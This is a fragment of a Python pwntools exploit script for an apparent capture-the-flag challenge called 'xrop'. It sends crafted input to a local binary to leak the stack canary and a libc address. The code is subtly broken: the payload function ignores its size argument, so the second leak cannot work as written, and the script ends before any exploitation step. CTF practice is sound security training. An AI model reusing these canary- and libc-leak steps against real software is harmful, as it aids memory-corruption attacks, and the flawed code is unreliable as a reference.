from pwn import *
import string

rem = process("./Pwnable/xrop/problem/deploy/prob")

lib = ELF("./Pwnable/xrop/problem/deploy/libc.so.6")

def send_payload(size):
  payload = b""
  letters = string.ascii_letters
  for i in range(0x19):
    payload += letters[i % len(letters)].encode()
  rem.sendafter(b"Input: ", payload)
  rem.recvuntil(b"You entered: ")
  rem.recvn(len(payload))

# temp = chr(payload[0])
# for i in range(1, len(payload)):
#   temp += chr(payload[i] ^ payload[i - 1])

send_payload(0x19)
canary = u64(b"\x00" + rem.recvn(7))

send_payload(0x28)
lib_base = u64(rem.recvn(6) + b"\x00" * 2)